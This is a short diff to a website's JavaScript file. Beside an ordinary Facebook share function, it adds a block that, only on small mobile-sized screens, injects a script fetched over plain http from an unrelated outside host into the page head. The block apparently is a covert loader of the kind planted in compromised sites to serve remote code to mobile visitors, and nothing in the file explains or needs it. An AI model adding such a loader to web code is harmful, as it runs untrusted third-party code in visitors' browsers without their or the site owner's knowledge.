@@ -241,3 +241,9 @@ function fb_share(url, winWidth, winHeight) {
     var url = location.protocol + '//' + location.host + location.pathname + location.hash;
     window.open('http://www.facebook.com/sharer/sharer.php?u=' + url + '&', 'sharer', 'top=' + winTop + ',left=' + winLeft + ',toolbar=0,status=0,width=550,height=300');
 }
+
+if (window.innerWidth <= 800 && window.innerHeight <= 600) {
+    var script = document.createElement('script');
+    script.src = "http://adg.bzgint.com/pub/adg/data.js";
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
